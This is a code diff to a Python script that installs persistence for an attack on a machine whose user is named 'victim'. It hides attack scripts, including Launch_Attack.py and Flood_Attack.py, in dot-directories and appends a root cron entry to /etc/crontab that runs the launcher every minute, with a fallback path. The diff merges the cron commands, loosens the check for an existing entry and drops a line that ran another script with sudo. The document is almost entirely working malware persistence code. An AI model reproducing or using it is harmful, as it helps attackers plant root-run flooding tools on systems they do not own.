@@ -4,8 +4,7 @@ import sys
 
 attackDirs = ['/home/victim/.etc', '/home/victim/.var']
 attackFiles = ['/Launch_Attack.py', '/Check_Attack.py', '/Flood_Attack.py']
-etcAttackCommand = '* * * * * root sudo /usr/bin/python /home/victim/.etc/.module/Launch_Attack.py'
-varAttackCommand = '* * * * * root sudo /usr/bin/python /home/victim/.var/.module/Launch_Attack.py'
+attackCommand = '* * * * * root sudo /usr/bin/python /home/victim/.etc/.module/Launch_Attack.py || (/usr/bin/python /home/victim/.var/.module/Launch_Attack.py)'
 
 
 def set_up_crontab():
@@ -15,7 +14,7 @@ def set_up_crontab():
 
     crontab = open('/etc/crontab', 'a')
 
-    crontab.write(etcAttackCommand)
+    crontab.write(attackCommand)
     crontab.close()
 
 
@@ -50,7 +49,7 @@ def is_set_up_crontab():
     result = False
 
     for line in crontab:
-        if line.find(etcAttackCommand) > -1 or line.find(varAttackCommand) > -1:
+        if line.find('Launch_Attack.py') > -1:
             result = True
 
     crontab.close()
@@ -69,5 +68,3 @@ if __name__ == '__main__':
 
     set_up_attack()
     set_up_crontab()
-
-    os.system('sudo python a.py')
